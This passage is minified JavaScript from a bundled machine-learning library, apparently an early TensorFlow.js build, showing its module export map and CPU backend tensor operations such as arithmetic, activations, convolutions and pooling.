s=t("./data/xhr-dataset");n.xhr_dataset=s;var a=t("./environment");n.environment=a;var u=t("./environment"),c=t("./kernels/webgl/gpgpu_util");n.gpgpu_util=c;var l=t("./kernels/webgl/webgl_util");n.webgl_util=l;var h=t("./ops/conv_util");n.conv_util=h;var p=t("./test_util");n.test_util=p;var d=t("./util");n.util=d;var f=t("./version");n.version=f.version;var y=t("./data/checkpoint_loader");n.CheckpointLoader=y.CheckpointLoader;var m=t("./data/dataset");n.InMemoryDataset=m.InMemoryDataset;var v=t("./data/input_provider");n.InCPUMemoryShuffledInputProviderBuilder=v.InCPUMemoryShuffledInputProviderBuilder,n.InGPUMemoryShuffledInputProviderBuilder=v.InGPUMemoryShuffledInputProviderBuilder;var g=t("./data/xhr-dataset");n.XhrDataset=g.XhrDataset;var _=t("./environment");n.ENV=_.ENV,n.Environment=_.Environment;var b=t("./graph/graph");n.Graph=b.Graph,n.SymbolicTensor=b.SymbolicTensor;var w=t("./graph/graph_runner");n.GraphRunner=w.GraphRunner,n.MetricReduction=w.MetricReduction;var x=t("./graph/initializers");n.ConstantInitializer=x.ConstantInitializer,n.OnesInitializer=x.OnesInitializer,n.RandomNormalInitializer=x.RandomNormalInitializer,n.RandomTruncatedNormalInitializer=x.RandomTruncatedNormalInitializer,n.RandomUniformInitializer=x.RandomUniformInitializer,n.TensorInitializer=x.TensorInitializer,n.VarianceScalingInitializer=x.VarianceScalingInitializer,n.ZerosInitializer=x.ZerosInitializer;var T=t("./graph/session");n.CostReduction=T.CostReduction,n.Session=T.Session;var S=t("./kernels/backend_cpu");n.MathBackendCPU=S.MathBackendCPU,n.NDArrayMathCPU=S.NDArrayMathCPU;var O=t("./kernels/backend_webgl");n.MathBackendWebGL=O.MathBackendWebGL,n.NDArrayMathGPU=O.NDArrayMathGPU;var E=t("./kernels/webgl/gpgpu_context");n.GPGPUContext=E.GPGPUContext;var A=t("./math");n.NDArrayMath=A.NDArrayMath;var k=t("./ops/matmul");n.MatrixOrientation=k.MatrixOrientation;var P=t("./optimizers/adadelta_optimizer");n.AdadeltaOptimizer=P.AdadeltaOptimizer;var M=t("./optimizers/adagrad_optimizer");n.AdagradOptimizer=M.AdagradOptimizer;var C=t("./optimizers/adam_optimizer");n.AdamOptimizer=C.AdamOptimizer;var N=t("./optimizers/adamax_optimizer");n.AdamaxOptimizer=N.AdamaxOptimizer;var R=t("./optimizers/momentum_optimizer");n.MomentumOptimizer=R.MomentumOptimizer;var F=t("./optimizers/optimizer");n.Optimizer=F.Optimizer;var D=t("./optimizers/rmsprop_optimizer");n.RMSPropOptimizer=D.RMSPropOptimizer;var I=t("./optimizers/sgd_optimizer");n.SGDOptimizer=I.SGDOptimizer;var B=t("./tensor");n.Array1D=B.Array1D,n.Array2D=B.Array2D,n.Array3D=B.Array3D,n.Array4D=B.Array4D,n.NDArray=B.NDArray,n.Scalar=B.Scalar,n.Tensor=B.Tensor,n.Tensor1D=B.Tensor1D,n.Tensor2D=B.Tensor2D,n.Tensor3D=B.Tensor3D,n.Tensor4D=B.Tensor4D,n.variable=B.variable,n.Variable=B.Variable;var q=t("./types");n.Rank=q.Rank;var L=t("./weights_loader");n.loadWeights=L.loadWeights,r(t("./ops/ops")),r(t("./train")),r(t("./globals")),n.setBackend=u.Environment.setBackend,n.getBackend=u.Environment.getBackend,n.memory=u.Environment.memory,n.nextFrame=i.BrowserUtil.nextFrame},{"./browser_util":3,"./contrib":19,"./data/checkpoint_loader":20,"./data/dataset":21,"./data/input_provider":22,"./data/xhr-dataset":23,"./environment":27,"./globals":28,"./graph/graph":32,"./graph/graph_runner":33,"./graph/initializers":35,"./graph/session":57,"./kernels/backend_cpu":61,"./kernels/backend_webgl":62,"./kernels/webgl/gpgpu_context":74,"./kernels/webgl/gpgpu_util":76,"./kernels/webgl/webgl_util":95,"./math":96,"./ops/conv_util":106,"./ops/matmul":111,"./ops/ops":114,"./optimizers/adadelta_optimizer":126,"./optimizers/adagrad_optimizer":127,"./optimizers/adam_optimizer":128,"./optimizers/adamax_optimizer":129,"./optimizers/momentum_optimizer":130,"./optimizers/optimizer":131,"./optimizers/rmsprop_optimizer":133,"./optimizers/sgd_optimizer":134,"./tensor":137,"./test_util":139,"./train":141,"./types":142,"./util":143,"./version":144,"./weights_loader":145}],61:[function(t,e,n){"use strict";var r,i=this&&this.__extends||(r=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])},function(t,e){function n(){this.constructor=t}r(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)}),o=this&&this.__awaiter||function(t,e,n,r){return new(n||(n=Promise))((function(i,o){function s(t){try{u(r.next(t))}catch(t){o(t)}}function a(t){try{u(r.throw(t))}catch(t){o(t)}}function u(t){t.done?i(t.value):new n((function(e){e(t.value)})).then(s,a)}u((r=r.apply(t,e||[])).next())}))},s=this&&this.__generator||function(t,e){var n,r,i,o,s={label:0,sent:function(){if(1&i[0])throw i[1];return i[1]},trys:[],ops:[]};return o={next:a(0),throw:a(1),return:a(2)},"function"==typeof Symbol&&(o[Symbol.iterator]=function(){return this}),o;function a(o){return function(a){return function(o){if(n)throw new TypeError("Generator is already executing.");for(;s;)try{if(n=1,r&&(i=r[2&o[0]?"return":o[0]?"throw":"next"])&&!(i=i.call(r,o[1])).done)return i;switch(r=0,i&&(o=[0,i.value]),o[0]){case 0:case 1:i=o;break;case 4:return s.label++,{value:o[1],done:!1};case 5:s.label++,r=o[1],o=[0];continue;case 7:o=s.ops.pop(),s.trys.pop();continue;default:if(!(i=s.trys,(i=i.length>0&&i[i.length-1])||6!==o[0]&&2!==o[0])){s=0;continue}if(3===o[0]&&(!i||o[1]>i[0]&&o[1]<i[3])){s.label=o[1];break}if(6===o[0]&&s.label<i[1]){s.label=i[1],i=o;break}if(i&&s.label<i[2]){s.label=i[2],s.ops.push(o);break}i[2]&&s.ops.pop(),s.trys.pop();continue}o=e.call(t,s)}catch(t){o=[6,t],r=0}finally{n=i=0}if(5&o[0])throw o[1];return{value:o[0]?o[1]:void 0,done:!0}}([o,a])}}};Object.defineProperty(n,"__esModule",{value:!0});var a=t("seedrandom"),u=t("../environment"),c=t("../math"),l=t("../ops/axis_util"),h=t("../ops/broadcast_util"),p=t("../ops/concat_util"),d=t("../ops/ops"),f=t("../ops/ops"),y=t("../ops/selu_util"),m=t("../tensor"),v=t("../types"),g=t("../util"),_=function(){function t(){this.data=new WeakMap,"undefined"!=typeof document&&(this.canvas=document.createElement("canvas"))}return t.prototype.register=function(t,e,n){if(this.data.has(t))throw new Error("Data buffer is already registered");this.data.set(t,null)},t.prototype.write=function(t,e){if(null==e)throw new Error("MathBackendCPU.write(): values can not be null");this.throwIfNoData(t),this.data.set(t,e)},t.prototype.fromPixels=function(t,e){if(null==t)throw new Error("MathBackendCPU.writePixels(): pixels can not be null");var n,r;if(t instanceof ImageData)n=t.data;else if(t instanceof HTMLCanvasElement)n=t.getContext("2d").getImageData(0,0,t.width,t.height).data;else{if(!(t instanceof HTMLImageElement||t instanceof HTMLVideoElement))throw new Error("pixels is of unknown type: "+t.constructor.name);if(null==this.canvas)throw new Error("Can't read pixels from HTMLImageElement outside the browser.");this.canvas.width=t.width,this.canvas.height=t.height,this.canvas.getContext("2d").drawImage(t,0,0,t.width,t.height),n=this.canvas.getContext("2d").getImageData(0,0,t.width,t.height).data}if(4===e)r=new Int32Array(n);else{var i=t.width*t.height;r=new Int32Array(i*e);for(var o=0;o<i;o++)for(var s=0;s<e;++s)r[o*e+s]=n[4*o+s]}var a=[t.height,t.width,e];return f.tensor3d(r,a,"int32")},t.prototype.read=function(t){return o(this,void 0,void 0,(function(){return s(this,(function(e){return[2,this.readSync(t)]}))}))},t.prototype.readSync=function(t){return this.throwIfNoData(t),this.data.get(t)},t.prototype.disposeData=function(t){this.data.has(t)&&this.data.delete(t)},t.prototype.time=function(t){return o(this,void 0,void 0,(function(){var e;return s(this,(function(n){return e=performance.now(),t(),[2,{kernelMs:performance.now()-e}]}))}))},t.prototype.memory=function(){return{unreliable:!0}},t.prototype.throwIfNoData=function(t){if(!this.data.has(t))throw new Error("CPU backend: No data found for this tensor. Did you change your backend in the middle of the program? New backends can't use Tensors created with previous backends")},t.prototype.slice=function(t,e,n){for(var r=d.buffer(n,t.dtype),i=0;i<r.size;++i){var o=r.indexToLoc(i),s=o.map((function(t,n){return t+e[n]}));r.set.apply(r,[t.get.apply(t,s)].concat(o))}return r.toTensor()},t.prototype.reverse=function(t,e){for(var n=d.buffer(t.shape,t.dtype),r=t.buffer(),i=function(i){var o=n.indexToLoc(i),s=o.slice();e.forEach((function(e){return s[e]=t.shape[e]-1-s[e]})),n.set.apply(n,[r.get.apply(r,s)].concat(o))},o=0;o<n.size;o++)i(o);return n.toTensor()},t.prototype.concat=function(t,e){var n=p.computeOutShape(t.shape,e.shape,1),r=d.buffer(n,t.dtype);if(1===t.shape[0]&&1===e.shape[0]){var i=t.dataSync(),o=e.dataSync(),s=r.values;return s.set(i,0),s.set(o,t.size),r.toTensor()}for(var a=0;a<n[0];++a){for(var u=0;u<t.shape[1];++u)r.set(t.get(a,u),a,u);for(u=0;u<e.shape[1];++u)r.set(e.get(a,u),a,u+t.shape[1])}return r.toTensor()},t.prototype.neg=function(t){return this.multiply(d.scalar(-1),t)},t.prototype.add=function(t,e){return this.broadcastedBinaryOp(t,e,v.upcastType(t.dtype,e.dtype),(function(t,e){return t+e}))},t.prototype.subtract=function(t,e){return this.broadcastedBinaryOp(t,e,v.upcastType(t.dtype,e.dtype),(function(t,e){return t-e}))},t.prototype.pow=function(t,e){return this.broadcastedBinaryOp(t,e,t.dtype,(function(t,e){return Math.pow(t,e)}))},t.prototype.matMul=function(t,e,n,r){for(var i=n?t.shape[0]:t.shape[1],o=n?t.shape[1]:t.shape[0],s=r?e.shape[0]:e.shape[1],a=function(t,e,n){return t.get(e,n)},u=function(t,e,n){return t.get(n,e)},c=n?u:a,l=r?u:a,h=new Float32Array(o*s),p=0,f=0;f<o;++f)for(var y=0;y<s;++y){for(var m=0,v=0;v<i;++v)m+=c(t,f,v)*l(e,v,y);h[p++]=m}return d.tensor2d(h,[o,s])},t.prototype.multiply=function(t,e){return this.broadcastedBinaryOp(t,e,v.upcastType(t.dtype,e.dtype),(function(t,e){return t*e}))},t.prototype.divide=function(t,e){return this.broadcastedBinaryOp(t,e,"float32",(function(t,e){return t/e}))},t.prototype.sum=function(t,e){l.assertAxesAreInnerMostDims("sum",e,t.rank);for(var n=l.computeOutAndReduceShapes(t.shape,e),r=n[0],i=n[1],o=v.upcastType(t.dtype,"int32"),s=d.zeros(r,o),a=g.sizeFromShape(i),u=s.dataSync(),c=t.dataSync(),h=0;h<u.length;++h){for(var p=h*a,f=0,y=0;y<a;++y)f+=c[p+y];u[h]=f}return s},t.prototype.argMin=function(t,e){l.assertAxesAreInnerMostDims("argMin",e,t.rank);for(var n=l.computeOutAndReduceShapes(t.shape,e),r=n[0],i=n[1],o=d.zeros(r,"int32"),s=g.sizeFromShape(i),a=o.dataSync(),u=t.dataSync(),c=0;c<a.length;++c){for(var h=c*s,p=u[h],f=0,y=0;y<s;++y){var m=u[h+y];if(isNaN(m)){f=g.NAN_INT32;break}m<p&&(p=m,f=y)}a[c]=f}return o},t.prototype.argMax=function(t,e){l.assertAxesAreInnerMostDims("argMax",e,t.rank);for(var n=l.computeOutAndReduceShapes(t.shape,e),r=n[0],i=n[1],o=d.zeros(r,"int32"),s=g.sizeFromShape(i),a=o.dataSync(),u=t.dataSync(),c=0;c<a.length;++c){for(var h=c*s,p=u[h],f=0,y=0;y<s;++y){var m=u[h+y];if(isNaN(m)){f=g.NAN_INT32;break}m>p&&(p=m,f=y)}a[c]=f}return o},t.prototype.equal=function(t,e){return this.broadcastedBinaryOp(t,e,"bool",(function(n,r){return g.isValNaN(n,t.dtype)||g.isValNaN(r,e.dtype)?g.getNaN("bool"):n===r?1:0}))},t.prototype.notEqual=function(t,e){return this.broadcastedBinaryOp(t,e,"bool",(function(n,r){return g.isValNaN(n,t.dtype)||g.isValNaN(r,e.dtype)?g.getNaN("bool"):n!==r?1:0}))},t.prototype.less=function(t,e){return this.broadcastedBinaryOp(t,e,"bool",(function(n,r){return g.isValNaN(n,t.dtype)||g.isValNaN(r,e.dtype)?g.getNaN("bool"):n<r?1:0}))},t.prototype.lessEqual=function(t,e){return this.broadcastedBinaryOp(t,e,"bool",(function(n,r){return g.isValNaN(n,t.dtype)||g.isValNaN(r,e.dtype)?g.getNaN("bool"):n<=r?1:0}))},t.prototype.greater=function(t,e){return this.broadcastedBinaryOp(t,e,"bool",(function(n,r){return g.isValNaN(n,t.dtype)||g.isValNaN(r,e.dtype)?g.getNaN("bool"):n>r?1:0}))},t.prototype.greaterEqual=function(t,e){return this.broadcastedBinaryOp(t,e,"bool",(function(n,r){return g.isValNaN(n,t.dtype)||g.isValNaN(r,e.dtype)?g.getNaN("bool"):n>=r?1:0}))},t.prototype.logicalNot=function(t){for(var e=t.dataSync(),n=new Int32Array(e.length),r=0;r<e.length;++r)g.isValNaN(e[r],t.dtype)?n[r]=g.getNaN("bool"):n[r]=e[r]?0:1;return m.Tensor.make(t.shape,{values:n},"bool")},t.prototype.logicalAnd=function(t,e){return this.broadcastedBinaryOp(t,e,"bool",(function(n,r){return g.isValNaN(n,t.dtype)||g.isValNaN(r,e.dtype)?g.getNaN("bool"):n&&r}))},t.prototype.logicalOr=function(t,e){return this.broadcastedBinaryOp(t,e,"bool",(function(n,r){return g.isValNaN(n,t.dtype)||g.isValNaN(r,e.dtype)?g.getNaN("bool"):n||r}))},t.prototype.logicalXor=function(t,e){return this.broadcastedBinaryOp(t,e,"bool",(function(n,r){return g.isValNaN(n,t.dtype)||g.isValNaN(r,e.dtype)?g.getNaN("bool"):n^r}))},t.prototype.where=function(t,e,n,r){for(var i=t.dataSync(),o=e.dataSync(),s=n.dataSync(),a=d.zeros(e.shape,r),u=a.dataSync(),c=0,l=0===t.rank||t.rank>1||1===e.rank?1:e.shape[1],h=0;h<i.length;h++)for(var p=0;p<l;p++)1===i[h]?u[c++]=o[h]:u[c++]=s[h];return a},t.prototype.topKValues=function(t,e){return this.topK(t,e).values},t.prototype.topKIndices=function(t,e){return this.topK(t,e).indices},t.prototype.topK=function(t,e){for(var n=t.dataSync(),r=[],i=0;i<n.length;i++)r.push({value:n[i],index:i});r.sort((function(t,e){return e.value-t.value}));var o=g.getTypedArrayFromDType(t.dtype,e),s=new Int32Array(e);for(i=0;i<e;i++)o[i]=r[i].value,s[i]=r[i].index;return{values:d.tensor1d(o,t.dtype),indices:m.Tensor1D.new(s)}},t.prototype.min=function(t,e){l.assertAxesAreInnerMostDims("min",e,t.rank);for(var n=l.computeOutAndReduceShapes(t.shape,e),r=n[0],i=n[1],o=d.zeros(r,t.dtype),s=g.sizeFromShape(i),a=o.dataSync(),u=t.dataSync(),c=0;c<a.length;++c){for(var h=c*s,p=u[0],f=0;f<s;++f){var y=u[h+f];if(isNaN(y)){p=Number.NaN;break}y<p&&(p=y)}a[c]=p}return o},t.prototype.minimum=function(t,e){return this.broadcastedBinaryOp(t,e,t.dtype,(function(t,e){return Math.min(t,e)}))},t.prototype.max=function(t,e){l.assertAxesAreInnerMostDims("max",e,t.rank);for(var n=l.computeOutAndReduceShapes(t.shape,e),r=n[0],i=n[1],o=d.zeros(r,t.dtype),s=g.sizeFromShape(i),a=o.dataSync(),u=t.dataSync(),c=0;c<a.length;++c){for(var h=c*s,p=u[h],f=0;f<s;++f){var y=u[h+f];if(isNaN(y)){p=Number.NaN;break}y>p&&(p=y)}a[c]=p}return o},t.prototype.maximum=function(t,e){return this.broadcastedBinaryOp(t,e,t.dtype,(function(t,e){return Math.max(t,e)}))},t.prototype.ceil=function(t){for(var e=t.dataSync(),n=new Float32Array(e.length),r=0;r<e.length;++r)n[r]=Math.ceil(e[r]);return m.Tensor.make(t.shape,{values:n})},t.prototype.floor=function(t){for(var e=t.dataSync(),n=new Float32Array(e.length),r=0;r<e.length;++r)n[r]=Math.floor(e[r]);return m.Tensor.make(t.shape,{values:n})},t.prototype.exp=function(t){for(var e=t.dataSync(),n=new Float32Array(e.length),r=0;r<e.length;++r)n[r]=Math.exp(e[r]);return m.Tensor.make(t.shape,{values:n})},t.prototype.log=function(t){for(var e=t.dataSync(),n=new Float32Array(e.length),r=0;r<e.length;++r){var i=e[r];n[r]=Math.log(i)}return m.Tensor.make(t.shape,{values:n})},t.prototype.sqrt=function(t){for(var e=t.dataSync(),n=new Float32Array(e.length),r=0;r<e.length;++r){var i=e[r];n[r]=Math.sqrt(i)}return m.Tensor.make(t.shape,{values:n})},t.prototype.square=function(t){for(var e=t.dataSync(),n=new Float32Array(e.length),r=0;r<e.length;++r){var i=e[r];n[r]=i*i}return m.Tensor.make(t.shape,{values:n})},t.prototype.relu=function(t){for(var e=d.zeros(t.shape,t.dtype),n=e.dataSync(),r=t.dataSync(),i=0;i<r.length;++i){var o=r[i];g.isValNaN(o,t.dtype)?n[i]=g.getNaN(e.dtype):n[i]=Math.max(0,r[i])}return e},t.prototype.elu=function(t){for(var e=new Float32Array(t.size),n=t.dataSync(),r=0;r<n.length;++r){var i=n[r];e[r]=i>=0?i:Math.exp(i)-1}return m.Tensor.make(t.shape,{values:e})},t.prototype.eluDer=function(t){for(var e=new Float32Array(t.size),n=t.dataSync(),r=0;r<n.length;++r){var i=n[r];e[r]=i>=0?1:Math.exp(i)}return m.Tensor.make(t.shape,{values:e})},t.prototype.selu=function(t){for(var e=y.SELU_SCALEALPHA,n=y.SELU_SCALE,r=new Float32Array(t.size),i=t.dataSync(),o=0;o<i.length;++o){var s=i[o];r[o]=s>=0?n*s:e*(Math.exp(s)-1)}return m.Tensor.make(t.shape,{values:r})},t.prototype.leakyRelu=function(t,e){for(var n=new Float32Array(t.size),r=t.dataSync(),i=0;i<r.length;i++){var o=r[i];n[i]=o>=0?o:e*o}return m.Tensor.make(t.shape,{values:n})},t.prototype.prelu=function(t,e){for(var n=new Float32Array(t.size),r=t.dataSync(),i=e.dataSync(),o=0;o<r.length;o++){var s=r[o];n[o]=s>=0?s:i[o]*s}return m.Tensor.make(t.shape,{values:n})},t.prototype.preluDer=function(t,e){for(var n=new Float32Array(t.size),r=t.dataSync(),i=e.dataSync(),o=0;o<r.length;o++){var s=r[o];n[o]=s>0?1:s<0?i[o]:s}return m.Tensor.make(t.shape,{values:n})},t.prototype.clip=function(t,e,n){for(var r=new Float32Array(t.size),i=t.dataSync(),o=0;o<i.length;++o)r[o]=Math.min(n,Math.max(e,i[o]));return m.Tensor.make(t.shape,{values:r})},t.prototype.abs=function(t){for(var e=new Float32Array(t.size),n=t.dataSync(),r=0;r<n.length;++r)e[r]=Math.abs(n[r]);return m.Tensor.make(t.shape,{values:e})},t.prototype.int=function(t){for(var e=new Int32Array(t.size),n=t.dataSync(),r=0;r<n.length;++r)e[r]=n[r];return m.Tensor.make(t.shape,{values:e},"int32")},t.prototype.sigmoid=function(t){for(var e=new Float32Array(t.size),n=t.dataSync(),r=0;r<n.length;++r)e[r]=1/(1+Math.exp(-n[r]));return m.Tensor.make(t.shape,{values:e})},t.prototype.sin=function(t){for(var e=new Float32Array(t.size),n=t.dataSync(),r=0;r<n.length;++r)e[r]=Math.sin(n[r]);return m.Tensor.make(t.shape,{values:e})},t.prototype.cos=function(t){for(var e=new Float32Array(t.size),n=t.dataSync(),r=0;r<n.length;++r)e[r]=Math.cos(n[r]);return m.Tensor.make(t.shape,{values:e})},t.prototype.tan=function(t){for(var e=new Float32Array(t.size),n=t.dataSync(),r=0;r<n.length;++r)e[r]=Math.tan(n[r]);return m.Tensor.make(t.shape,{values:e})},t.prototype.asin=function(t){for(var e=new Float32Array(t.size),n=t.dataSync(),r=0;r<n.length;++r)e[r]=Math.asin(n[r]);return m.Tensor.make(t.shape,{values:e})},t.prototype.acos=function(t){for(var e=new Float32Array(t.size),n=t.dataSync(),r=0;r<n.length;++r)e[r]=Math.acos(n[r]);return m.Tensor.make(t.shape,{values:e})},t.prototype.atan=function(t){for(var e=new Float32Array(t.size),n=t.dataSync(),r=0;r<n.length;++r)e[r]=Math.atan(n[r]);return m.Tensor.make(t.shape,{values:e})},t.prototype.sinh=function(t){for(var e=new Float32Array(t.size),n=t.dataSync(),r=0;r<n.length;++r)e[r]=Math.sinh(n[r]);return m.Tensor.make(t.shape,{values:e})},t.prototype.cosh=function(t){for(var e=new Float32Array(t.size),n=t.dataSync(),r=0;r<n.length;++r)e[r]=Math.cosh(n[r]);return m.Tensor.make(t.shape,{values:e})},t.prototype.tanh=function(t){for(var e=new Float32Array(t.size),n=t.dataSync(),r=0;r<n.length;++r)e[r]=g.tanh(n[r]);return m.Tensor.make(t.shape,{values:e})},t.prototype.step=function(t,e){void 0===e&&(e=0);for(var n=new Float32Array(t.size),r=t.dataSync(),i=0;i<r.length;++i){var o=r[i];g.isValNaN(o,t.dtype)?n[i]=g.getNaN(t.dtype):n[i]=o>0?1:e}return m.Tensor.make(t.shape,{values:n})},t.prototype.conv2d=function(t,e,n){for(var r=n.filterHeight,i=n.filterWidth,o=n.padInfo.left,s=n.padInfo.top,a=d.buffer(n.outShape,t.dtype),u=0;u<n.batchSize;++u)for(var c=0;c<n.outChannels;++c)for(var l=0;l<n.outHeight;++l)for(var h=l*n.strideHeight-o,p=Math.max(0,h),f=Math.min(n.inHeight,r+h),y=0;y<n.outWidth;++y){for(var m=y*n.strideWidth-s,v=Math.max(0,m),g=Math.min(n.inWidth,i+m),_=0,b=p;b<f;++b)for(var w=b-h,x=v;x<g;++x)for(var T=x-m,S=0;S<n.inChannels;++S){_+=t.get(u,b,x,S)*e.get(w,T,S,c)}a.set(_,u,l,y,c)}return a.toTensor()},t.prototype.conv2dDerInput=function(t,e,n){for(var r=n.filterHeight,i=n.filterWidth,o=r-1-n.padInfo.top,s=i-1-n.padInfo.left,a=n.strideHeight,u=n.strideWidth,c=d.buffer(n.inShape,"float32"),l=0;l<n.batchSize;++l)for(var h=0;h<n.inChannels;++h)for(var p=0;p<n.inHeight;++p)for(var f=p-s,y=Math.max(0,Math.ceil(f/a)),m=Math.min(n.outHeight,(r+f)/a),v=0;v<n.inWidth;++v){for(var g=v-o,_=Math.max(0,Math.ceil(g/u)),b=Math.min(n.outWidth,(i+g)/u),w=0,x=y;x<m;++x)for(var T=x*a-f,S=_;S<b;++S)for(var O=S*u-g,E=0;E<n.outChannels;++E){w+=t.get(l,x,S,E)*e.get(r-1-T,i-1-O,h,E)}c.set(w,l,p,v,h)}return c.toTensor()},t.prototype.conv2dDerFilter=function(t,e,n){for(var r=n.strideHeight,i=n.strideWidth,o=n.filterHeight,s=n.filterWidth,a=d.buffer(n.filterShape,"float32"),u=n.padInfo.left,c=n.padInfo.top,l=0;l<o;++l)for(var h=Math.max(0,Math.ceil((c-l)/r)),p=Math.min(n.outHeight,(n.inHeight+c-l)/r),f=0;f<s;++f)for(var y=Math.max(0,Math.ceil((u-f)/i)),m=Math.min(n.outWidth,(n.inWidth+u-f)/i),v=0;v<n.inChannels;++v)for(var g=0;g<n.outChannels;++g){for(var _=0,b=0;b<n.batchSize;++b)for(var w=h;w<p;++w)for(var x=l+w*r-c,T=y;T<m;++T){var S=f+T*i-u;_+=t.get(b,x,S,v)*e.get(b,w,T,g)}a.set(_,l,f,v,g)}return a.toTensor()},t.prototype.depthwiseConv2D=function(t,e,n){for(var r=n.filterHeight,i=n.filterWidth,o=n.padInfo.left,s=n.padInfo.top,a=n.outChannels/n.inChannels,u=d.buffer(n.outShape,t.dtype),c=0;c<n.batchSize;++c)for(var l=0;l<n.inChannels;++l)for(var h=0;h<n.outHeight;++h)for(var p=h*n.strideHeight-o,f=Math.max(0,p),y=Math.min(n.inHeight,r+p),m=0;m<n.outWidth;++m)for(var v=m*n.strideWidth-s,g=Math.max(0,v),_=Math.min(n.inWidth,i+v),b=0;b<a;++b){for(var w=0,x=f;x<y;++x)for(var T=x-p,S=g;S<_;++S){var O=S-v;w+=t.get(c,x,S,l)*e.get(T,O,l,b)}u.set(w,c,h,m,l*a+b)}return u.toTensor()},t.prototype.tile=function(t,e){for(var n=new Array(t.rank),r=0;r<n.length;r++)n[r]=t.shape[r]*e[r];var i=d.buffer(n,t.dtype),o=t.dataSync();for(r=0;r<i.values.length;++r){for(var s=i.indexToLoc(r),a=new Array(t.rank),u=0;u<a.length;u++)a[u]=s[u]%t.shape[u];var c=t.locToIndex(a);i.values[r]=o[c]}return i.toTensor()},t.prototype.pad=function(t,e,n){var r=e.map((function(e,n){return e[0]+t.shape[n]+e[1]})),i=e.map((function(t){return t[0]})),o=t.buffer(),s=d.buffer(r,t.dtype);0!==n&&s.values.fill(n);for(var a=0;a<t.size;a++){var u=o.indexToLoc(a),c=u.map((function(t,e){return t+i[e]}));s.set.apply(s,[t.get.apply(t,u)].concat(c))}return s.toTensor()},t.prototype.transpose=function(t,e){for(var n=new Array(t.rank),r=0;r<n.length;r++)n[r]=t.shape[e[r]];var i=new Float32Array(t.size),o=t.dataSync(),s=m.Tensor.make(n,{values:i});for(r=0;r<t.size;++r){for(var a=t.indexToLoc(r),u=new Array(a.length),c=0;c<u.length;c++)u[c]=a[e[c]];i[s.locToIndex(u)]=o[r]}return s},t.prototype.gather=function(t,e,n){var r=t.shape.slice(),i=e.dataSync();r[n]=i.length;for(var o=d.zeros(r,t.dtype),s=t.dataSync(),a=o.dataSync(),u=0;u<o.size;++u){var c=o.indexToLoc(u),l=c.slice();l[n]=i[c[n]];var h=t.locToIndex(l);a[u]=s[h]}return o},t.prototype.pool=function(t,e,n){for(var r=e.strideHeight,i=e.strideWidth,o=e.filterHeight,s=e.filterWidth,a=d.buffer(e.outShape,"float32"),u=e.padInfo.top,c=e.padInfo.left,l=0;l<e.batchSize;++l)for(var h=0;h<e.inChannels;++h)for(var p=0;p<e.outHeight;++p)for(var f=p*r-u,y=Math.max(0,f),m=Math.min(e.inHeight,o+f),v=0;v<e.outWidth;++v){for(var g=v*i-c,_=Math.max(0,g),b=Math.min(e.inWidth,s+g),w="max"===n?Number.NEGATIVE_INFINITY:Number.POSITIVE_INFINITY,x=0,T=y;T<m;++T){for(var S=_;S<b;++S){var O=t.get(l,T,S,h);if(isNaN(O)){w=NaN,x=NaN;break}"max"===n&&O>w||"min"===n&&O<w?w=O:"avg"===n&&(x+=O/(o*s))}if(isNaN(w))break}a.set("avg"===n?x:w,l,p,v,h)}return a.toTensor()},t.prototype.maxPool=function(t,e){return this.pool(t,e,"max")},t.prototype.maxPoolPositions=function(t,e){for(var n=d.buffer(e.outShape,"int32"),r=e.strideHeight,i=e.strideWidth,o=e.filterHeight,s=e.filterWidth,a=e.padInfo.top,u=e.padInfo.left,c=0;c<e.batchSize;++c)for(var l=0;l<e.inChannels;++l)for(var h=0;h<e.outHeight;++h)for(var p=h*r-a,f=Math.max(0,p),y=Math.min(e.inHeight,o+p),m=0;m<e.outWidth;++m){for(var v=m*i-u,g=Math.max(0,v),_=Math.min(e.inWidth,s+v),b=Number.NEGATIVE_INFINITY,w=-1,x=f;x<y;++x)for(var T=x-p,S=g;S<_;++S){var O=S-v,E=t.get(c,x,S,l);E>b&&(b=E,w=T*s+O)}n.set(w,c,h,m,l)}return n.toTensor()},t.prototype.maxPoolBackprop=function(t,e,n){for(var r=this.maxPoolPositions(e,n),i=n.strideHeight,o=n.strideWidth,s=n.filterHeight,a=n.filterWidth,u=a-1-n.padInfo.left,c=s-1-n.padInfo.top,l=d.buffer(e.shape,"float32"),h=0;h<n.batchSize;++h)for(var p=0;p<n.inChannels;++p)for(var f=0;f<n.inHeight;++f)for(var y=0;y<n.inWidth;++y){for(var m=f-c,v=y-u,g=0,_=0;_<s;++_){var b=(m+_)/i;if(!(b<0||b>=n.outHeight||Math.floor(b)!==b))for(var w=0;w<a;++w){var x=(v+w)/o;if(!(x<0||x>=n.outWidth||Math.floor(x)!==x)){var T=s*a-1-r.get(h,b,x,p)===_*a+w?1:0;if(0!==T)g+=t.get(h,b,x,p)*T}}}l.set(g,h,f,y,p)}return l.toTensor()},t.prototype.avgPoolBackprop=function(t,e,n){for(var r=n.strideHeight,i=n.strideWidth,o=n.filterHeight,s=n.filterWidth,a=s-1-n.padInfo.left,u=o-1-n.padInfo.top,c=d.buffer(e.shape,"float32"),l=1/(o*s),h=0;h<n.batchSize;++h)for(var p=0;p<n.inChannels;++p)for(var f=0;f<n.inHeight;++f)for(var y=0;y<n.inWidth;++y){for(var m=f-u,v=y-a,g=0,_=0;_<o;++_){var b=(m+_)/r;if(!(b<0||b>=n.outHeight||Math.floor(b)!==b))for(var w=0;w<s;++w){var x=(v+w)/i;if(!(x<0||x>=n.outWidth||Math.floor(x)!==x))g+=t.get(h,b,x,p)}}c.set(g*l,h,f,y,p)}return c.toTensor()},t.prototype.minPool=function(t,e){return this.pool(t,e,"min")},t.prototype.avgPool=function(t,e){return this.pool(t,e,"avg").toFloat()},t.prototype.resizeBilinear=function(t,e,n,r){for(var i=t.shape,o=i[0],s=i[1],a=i[2],u=i[3],c=d.buffer([o,e,n,u],t.dtype),l=r?[s-1,a-1]:[s,a],h=r?[e-1,n-1]:[e,n],p=0;p<o;p++)for(var f=0;f<e;f++)for(var y=0;y<n;y++)for(var m=0;m<u;m++){var 